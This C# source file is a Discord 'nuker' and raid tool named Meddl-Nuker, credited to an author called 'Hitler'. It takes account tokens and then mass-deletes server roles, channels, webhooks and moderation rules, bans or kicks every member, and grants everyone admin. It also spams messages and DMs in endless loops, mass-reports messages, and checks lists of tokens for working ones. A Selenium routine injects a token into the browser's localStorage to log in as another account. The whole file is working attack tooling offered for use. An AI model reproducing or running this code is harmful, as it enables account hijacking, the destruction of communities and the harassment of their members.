using System.Drawing;
using Console = Colorful.Console;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using WebDriverManager;
using WebDriverManager.DriverConfigs.Impl;
using WebDriverManager.Helpers;

/* 
       │ Author       : Hitler
       │ Name         : Meddl-Nuker
*/

namespace Meddl
{
    class Program
    {
        #region Configuration
        static string? token;
        static readonly List<string> tokenlist = new();
        static ulong? guildid;
        #endregion

        #region Write Logo
        static void WriteLogo()
        {
            Console.Clear();
            string Meddl = @"
                            ██████╗ ███████╗████████╗███████╗██████╗ 
                            ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
                            ██████╔╝█████╗     ██║   █████╗  ██████╔╝
                            ██╔═══╝ ██╔══╝     ██║   ██╔══╝  ██╔══██╗
                            ██║     ███████╗   ██║   ███████╗██║  ██║
                            ╚═╝     ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                                       
                                           
                                                      ";
            Console.WriteWithGradient(Meddl, Color.OrangeRed, Color.Yellow, 6);
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main()
        {
           
            Console.Title = "Peter";
            try
            {
                Console.ForegroundColor = Color.Yellow;
                if (!File.Exists("token.txt"))
                    File.Create("token.txt").Dispose();
                if (!File.Exists("multitokens.txt"))
                    File.Create("multitokens.txt").Dispose();
                var Token = File.ReadAllText("token.txt");
                if (!string.IsNullOrEmpty(Token))
                    token = Token;
                Options();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message + "\n\nPress any key to exit.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion

        #region Options
        static void Options()
        {
            try
            {
                WriteLogo();
                string options = @"
╔════════════════════════╦════════════════════════════════════════════════════════════╦═════════════════════╗
║ > Account Nuker        ║ > Server Nuker                                             ║ > MultiToken Raider ║
╠══╦═════════════════════╬══╦══════════════════════╦══╦═══════════════════════════════╬══╦══════════════════╣
║01║ Edit Profile        ║15║ Delete Roles         ║29║ Delete Stickers               ║43║ Join Guild/Group ║
║02║ Leave/Delete Guilds ║16║ Remove All Bans      ║30║ Grant Everyone Admin          ║44║ Leave Guild      ║
║03║ Clear Relationships ║17║ Delete All Channels  ║31║ Delete Auto Moderation Rules  ║45║ Add Friend       ║
║04║ Leave HypeSquad     ║18║ Delete All Emojis    ║32║ Mass Create Invites           ║46║ Spam             ║
║05║ Remove Connections  ║19║ Delete All Invites   ║33║ Delete Guild Scheduled Events ║47║ Add Reaction     ║
║06║ Deauthorize Apps    ║20║ Mass Create Roles    ║34║ Delete Guild Template         ║48║ Block User       ║
║07║ Mass Create Guilds  ║21║ Mass Create Channels ║35║ Delete Stage Instances        ║49║ DM User          ║
║08║ Seizure Mode        ║22║ Prune Members        ║36║ Delete All Webhooks           ║50║ Leave Group      ║
║09║ Confuse Mode        ║23║ Remove Integrations  ║37║ Webhook Spammer               ║51║ Trigger Typing   ║
║10║ Mass DM             ║24║ Remove All Reactions ║38║ Mass Report                   ║52║ Report Message   ║
║11║ User Info           ║25║ Guild Info           ║39║ Ban All Members               ║53║ Check Tokens     ║
║12║ Block Relationships ║26║ Leave/Delete Guild   ║40║ Kick All Members              ║54║ Exit             ║
║13║ Delete DMs          ║27║ Msg In Every Channel ║41║ Rename Everyone               ║55║                  ║
║14║ Login to Account    ║28║ Delete Webhook       ║42║ Change Guild ID               ║56║                  ║
╚══╩═════════════════════╩══╩══════════════════════╩══╩═══════════════════════════════╩══╩══════════════════╝
";

                Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine();
                Console.Write("Your choice: ");
                int choice = int.Parse(Console.ReadLine());
                switch (choice)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(2000);
                        Console.Clear();
                        Options();
                        break;
                    case 1:
                        Token();
                        WriteLogo();
                        string options2 = @"
╔══╦════════════╗
║##║ Name       ║
╠══╬════════════╣
║00║ None       ║
║01║ Bravery    ║
║02║ Brilliance ║
║03║ Balance    ║
╚══╩════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options2);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        string hypesquad = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Biography: ");
                        string bio = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Custom Status: ");
                        string status = Console.ReadLine();
                        WriteLogo();
                        User.EditProfile(token, hypesquad, bio, status);
                        Options();
                        break;
                    case 2:
                        Token();
                        WriteLogo();
                        User.LeaveDeleteGuilds(token);
                        Options();
                        break;
                    case 3:
                        Token();
                        WriteLogo();
                        User.ClearRelationships(token);
                        Options();
                        break;
                    case 4:
                        Token();
                        WriteLogo();
                        User.LeaveHypeSquad(token);
                        Options();
                        break;
                    case 5:
                        Token();
                        WriteLogo();
                        User.RemoveConnections(token);
                        Options();
                        break;
                    case 6:
                        Token();
                        WriteLogo();
                        User.DeauthorizeApps(token);
                        Options();
                        break;
                    case 7:
                        Token();
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            User.CreateGuild(token, name);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine($"Created: {numb}", Color.Lime);
                        }
                        Options();
                        break;
                    case 8:
                        Token();
                        WriteLogo();
                        Task.Run(() => { for (; ; ) { try { foreach (var token in tokenlist) User.ChangeTheme(token, "light"); User.ChangeTheme(token, "dark"); } catch { } } });
                        Options();
                        break;
                    case 9:
                        Token();
                        WriteLogo();
                        User.ConfuseMode(token);
                        Options();
                        break;
                    case 10:
                        Token();
                        WriteLogo();
                        Console.Write("Message: ");
                        string message = Console.ReadLine();
                        WriteLogo();
                        User.MassDM(token, message);
                        Options();
                        break;
                    case 11:
                        Token();
                        WriteLogo();
                        User.UserInformation(token);
                        Options();
                        break;
                    case 12:
                        Token();
                        WriteLogo();
                        User.BlockRelationships(token);
                        Options();
                        break;
                    case 13:
                        Token();
                        WriteLogo();
                        User.DeleteDMs(token);
                        Options();
                        break;
                    case 14:
                        Token();
                        WriteLogo();
                        SeleniumLogin();
                        Options();
                        break;
                    case 15:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteRoles(token, guildid);
                        Options();
                        break;
                    case 16:
                        GuildID();
                        WriteLogo();
                        Guild.RemoveBans(token, guildid);
                        Options();
                        break;
                    case 17:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteChannels(token, guildid);
                        Options();
                        break;
                    case 18:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteEmojis(token, guildid);
                        Options();
                        break;
                    case 19:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteInvites(token, guildid);
                        Options();
                        break;
                    case 20:
                        GuildID();
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count3 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb3 = 0;
                        for (int i = 0; i < count3; i++)
                        {
                            numb3++;
                            Guild.CreateRole(token, guildid, name2);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine("Created: " + numb3, Color.Lime);
                        }
                        Options();
                        break;
                    case 21:
                        GuildID();
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name3 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count4 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb4 = 0;
                        for (int i = 0; i < count4; i++)
                        {
                            numb4++;
                            Guild.CreateChannel(token, guildid, name3);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine("Created: " + numb4, Color.Lime);
                        }
                        Options();
                        break;
                    case 22:
                        GuildID();
                        WriteLogo();
                        Guild.PruneMembers(token, guildid);
                        Options();
                        break;
                    case 23:
                        GuildID();
                        WriteLogo();
                        Guild.RemoveIntegrations(token, guildid);
                        Options();
                        break;
                    case 24:
                        GuildID();
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Guild.DeleteAllReactions(token, cid, mid);
                        Options();
                        break;
                    case 25:
                        GuildID();
                        WriteLogo();
                        Guild.GuildInformation(token, guildid);
                        Options();
                        break;
                    case 26:
                        GuildID();
                        WriteLogo();
                        Guild.LeaveDeleteGuild(token, guildid);
                        Options();
                        break;
                    case 27:
                        GuildID();
                        WriteLogo();
                        string options3 = @"
╔══╦═════════════╗
║##║ Name        ║
╠══╬═════════════╣
║01║ Spam        ║
║02║ One Message ║
╚══╩═════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options3);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int choice2 = int.Parse(Console.ReadLine());
                        switch (choice2)
                        {
                            case 1:
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg3 = Console.ReadLine();
                                WriteLogo();
                                Task.Run(() => { for (; ; ) { try { Guild.MsgInEveryChannel(token, guildid, msg3); } catch { } } });
                                break;
                            case 2:
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg4 = Console.ReadLine();
                                WriteLogo();
                                Guild.MsgInEveryChannel(token, guildid, msg4);
                                break;
                        }
                        Options();
                        break;
                    case 28:
                        GuildID();
                        WriteLogo();
                        Console.Write("Webhook URL/ID: ");
                        string? webhook = Console.ReadLine();
                        webhook = webhook.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid = ulong.Parse(webhook.Split('/')[0]);
                        WriteLogo();
                        Guild.DeleteWebhook(token, wid);
                        Console.WriteLine("Done");
                        Options();
                        break;
                    case 29:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteStickers(token, guildid);
                        Options();
                        break;
                    case 30:
                        GuildID();
                        WriteLogo();
                        Guild.GrantEveryoneAdmin(token, guildid);
                        Options();
                        break;
                    case 31:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteAutoModerationRules(token, guildid);
                        Options();
                        break;
                    case 32:
                        GuildID();
                        WriteLogo();
                        Guild.CreateInvite(token, guildid);
                        Options();
                        break;
                    case 33:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteGuildScheduledEvents(token, guildid);
                        Options();
                        break;
                    case 34:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteGuildTemplate(token, guildid);
                        Options();
                        break;
                    case 35:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteStageInstances(token, guildid);
                        Options();
                        break;
                    case 36:
                        GuildID();
                        WriteLogo();
                        Guild.DeleteWebhooks(token, guildid);
                        Options();
                        break;
                    case 37:
                        GuildID();
                        WriteLogo();
                        Console.Write("Webhook URL: ");
                        string webhook2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Message: ");
                        string message2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count: ");
                        int mcount = int.Parse(Console.ReadLine());
                        WriteLogo();
                        webhook2 = webhook2.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid2 = ulong.Parse(webhook2.Split('/')[0]);
                        string wtoken = webhook2.Split('/')[1];
                        int total = 0;
                        for (int i = 0; i < mcount; i++)
                        {
                            total++;
                            Guild.SendWebhookMessage(token, wid2, wtoken, message2);
                            Console.WriteLine("Messages sent: " + total);
                        }
                        Options();
                        break;
                    case 38:
                        GuildID();
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options4 = @"
╔══╦════════════════════════╗
║##║ Name                   ║
╠══╬════════════════════════╣
║01║ Illegal Content        ║
║02║ Harrassment            ║
║03║ Spam Or Phishing Links ║
║04║ Self Harm              ║
║05║ NSFW                   ║
╚══╩════════════════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options4);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason = int.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Reports count: ");
                        int count5 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int reports = 0;
                        for (int i = 0; i < count5; i++)
                        {
                            Guild.ReportMessage(token, gid, cid2, mid2, reason);
                            reports++;
                            Console.WriteLine("Reports sent: " + reports);
                        }
                        Options();
                        break;
                    case 39:
                        GuildID();
                        WriteLogo();
                        Bot.BanAllMembers(token, guildid);
                        Options();
                        break;
                    case 40:
                        GuildID();
                        WriteLogo();
                        Bot.KickAllMembers(token, guildid);
                        Options();
                        break;
                    case 41:
                        GuildID();
                        WriteLogo();
                        Console.Write("Nickname: ");
                        string nick = Console.ReadLine();
                        WriteLogo();
                        Bot.ChangeAllNicknames(token, guildid, nick);
                        Options();
                        break;
                    case 42:
                        GuildID();
                        Options();
                        break;
                    case 43:
                        MultiTokens();
                        WriteLogo();
                        Console.WriteLine("If your tokens isn't phone verified, Discord may lock them.\n");
                        Console.Write("Invite code: ");
                        string code = Console.ReadLine();
                        if (code.Contains("https://discord.gg/"))
                            code = code.Replace("https://discord.gg/", "");
                        if (code.Contains("https://discord.com/invite/"))
                            code = code.Replace("https://discord.com/invite/", "");
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.JoinGuild(token, code);
                        Options();
                        break;
                    case 44:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? id = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.LeaveGuild(token, id);
                        Options();
                        break;
                    case 45:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Full Username: ");
                        string full = Console.ReadLine();
                        string user = full.Split('#')[0];
                        uint discriminator = uint.Parse(full.Split('#')[1]);
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.AddFriend(token, user, discriminator);
                        Options();
                        break;
                    case 46:
                        MultiTokens();
                        WriteLogo();
                        string options7 = @"
╔══╦═════════════╗
║##║ Name        ║
╠══╬═════════════╣
║01║ Spam        ║
║02║ One Message ║
╚══╩═════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options7);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int choice4 = int.Parse(Console.ReadLine());
                        switch (choice4)
                        {
                            case 1:
                                WriteLogo();
                                Console.Write("Channel ID: ");
                                ulong? cid3 = ulong.Parse(Console.ReadLine());
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg = Console.ReadLine();
                                WriteLogo();
                                Task.Run(() => { try { for (; ; ) { foreach (var token in tokenlist) Raid.SendMessage(token, cid3, msg); } } catch { } });
                                break;
                            case 2:
                                WriteLogo();
                                Console.Write("Channel ID: ");
                                ulong? cid7 = ulong.Parse(Console.ReadLine());
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg3 = Console.ReadLine();
                                WriteLogo();
                                Task.Run(() => { try { foreach (var token in tokenlist) Raid.SendMessage(token, cid7, msg3); } catch { } });
                                break;
                        }
                        Options();
                        break;
                    case 47:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid4 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options5 = @"
╔══╦═════════════════════════════════════════════════════════════════════╗
║##║ Name                                                                ║
╠══╬══════════════════════╦══╦═════════════════════════════╦══╦══════════╣
║01║ Heart                ║06║ Billed Cap                  ║11║ Skull    ║
║02║ White Check Mark     ║07║ Negative Squared Cross Mark ║12║ Clown    ║
║03║ Regional Indicator L ║08║ Neutral Face                ║13║ No Mouth ║
║04║ Regional Indicator W ║09║ Nerd Face                   ║14║ Sob      ║
║05║ Middle Finger        ║10║ Joy                         ║15║ Eggplant ║
╚══╩══════════════════════╩══╩═════════════════════════════╩══╩══════════╝
";
                        Dictionary<int, string> emojis = new()
                        {
                            {1, "❤️"},
                            {2, "✅"},
                            {3, "🇱"},
                            {4, "🇼"},
                            {5, "🖕"},
                            {6, "🧢"},
                            {7, "❎"},
                            {8, "😐"},
                            {9, "🤓"},
                            {10, "😂"},
                            {11, "💀"},
                            {12, "🤡"},
                            {13, "😶"},
                            {14, "😭"},
                            {15, "🍆"}
                        };

                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options5);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int choice3 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        if (emojis.ContainsKey(choice3))
                            foreach (var token in tokenlist) Raid.AddReaction(token, cid4, mid3, emojis[choice3]);
                        Options();
                        break;
                    case 48:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.BlockUser(token, uid2);
                        Options();
                        break;
                    case 49:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg2 = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.DMUser(token, uid, msg2);
                        Options();
                        break;
                    case 50:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Group ID: ");
                        ulong? gid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.LeaveGroup(token, gid2);
                        Options();
                        break;
                    case 51:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid5 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.TriggerTyping(token, cid5);
                        Options();
                        break;
                    case 52:
                        MultiTokens();
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid6 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid4 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options6 = @"
╔══╦════════════════════════╗
║##║ Name                   ║
╠══╬════════════════════════╣
║01║ Illegal Content        ║
║02║ Harrassment            ║
║03║ Spam Or Phishing Links ║
║04║ Self Harm              ║
║05║ NSFW                   ║
╚══╩════════════════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options6);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason2 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.ReportMessage(token, gid3, cid6, mid4, reason2);
                        Options();
                        break;
                    case 53:
                        MultiTokens();
                        WriteLogo();
                        Console.ReplaceAllColorsWithDefaults();
                        foreach (var token in tokenlist)
                        {
                            try
                            {
                                Request.SendGet("/users/@me", token);
                                Console.WriteLine(token, Color.Lime);
                                File.AppendAllText("WorkingTokens.txt", token + Environment.NewLine);
                            }
                            catch { Console.WriteLine(token, Color.Red); }
                            Thread.Sleep(200);
                        }
                        Console.ForegroundColor = Color.Yellow;
                        Console.WriteLine("Working tokens were saved to WorkingTokens.txt");
                        Thread.Sleep(3000);
                        Options();
                        break;
                    case 54:
                        Environment.Exit(0);
                        break;
                    case 55:
                        WriteLogo();
                        Options();
                        break;
                    case 56:
                        WriteLogo();
                        Options();
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion

        #region Token
        static void Token()
        {
            if (string.IsNullOrEmpty(token))
            {
                try
                {
                    Console.Clear();
                    WriteLogo();
                    Console.ForegroundColor = Color.Yellow;
                    Console.WriteLine();
                    Console.Write("Token: ");
                    token = Console.ReadLine();
                    token = token.Replace("'", "");
                    token = token.Replace("\"", "");
                    File.WriteAllText("token.txt", token);
                    if (User.GetUsername(token) == "N/A")
                    {
                        WriteLogo();
                        Console.WriteLine("Invalid token.");
                        token = string.Empty;
                        Thread.Sleep(3000);
                        Options();
                    }
                    try { Request.SendGet("/users/@me", token); } catch { Config.IsBot = true; }
                    Console.Clear();
                }
                catch { }
            }
        }
        #endregion

        #region Guild ID
        static void GuildID()
        {
            if (guildid == null)
            {
                try
                {
                    Console.Clear();
                    WriteLogo();
                    Console.ForegroundColor = Color.Yellow;
                    Console.WriteLine();
                    Console.Write("Guild ID: ");
                    guildid = ulong.Parse(Console.ReadLine());
                    foreach (var token in tokenlist)
                    {
                        if (Guild.GetGuildName(token, guildid) == "N/A")
                        {
                            WriteLogo();
                            Console.WriteLine("Invalid ID or you're not in the guild.");
                            guildid = ulong.Parse("");
                            Thread.Sleep(3000);
                            Options();
                        }
                    }
                    Console.Clear();
                }
                catch { }
            }
        }
        #endregion

        #region MultiTokens
        static int count = 0;
        static void MultiTokens()
        {
            try
            {
                Console.Clear();
                WriteLogo();
                var list = File.ReadAllLines("multitokens.txt");
                foreach (var token in list)
                {
                    if (!tokenlist.Contains(token))
                    {
                        count++;
                        tokenlist.Add(token);
                    }
                }
                if (count == 0)
                {
                    WriteLogo();
                    Console.WriteLine("Paste your tokens in multitokens.txt file.");
                    Thread.Sleep(3000);
                    Options();
                }
                Console.Clear();
            }
            catch { }
        }
        #endregion

        #region Selenium Login
        static void SeleniumLogin()
        {
            try
            {
                new DriverManager().SetUpDriver(new ChromeConfig(), VersionResolveStrategy.MatchingBrowser);

                Console.WriteLine("Please wait");

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.EnableVerboseLogging = false;
                service.SuppressInitialDiagnosticInformation = true;
                service.HideCommandPromptWindow = true;

                ChromeOptions options = new();
                options.AddArguments(new string[] { "--disable-logging", "--mute-audio", "--disable-extensions", "--disable-notifications", "--disable-application-cache", "--no-sandbox", "--disable-crash-reporter", "--disable-dev-shm-usage", "--disable-gpu", "--ignore-certificate-errors", "--disable-infobars", "--silent" });

                IWebDriver driver = new ChromeDriver(service, options) { Url = "https://discord.com/login" };

                IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion
    }
}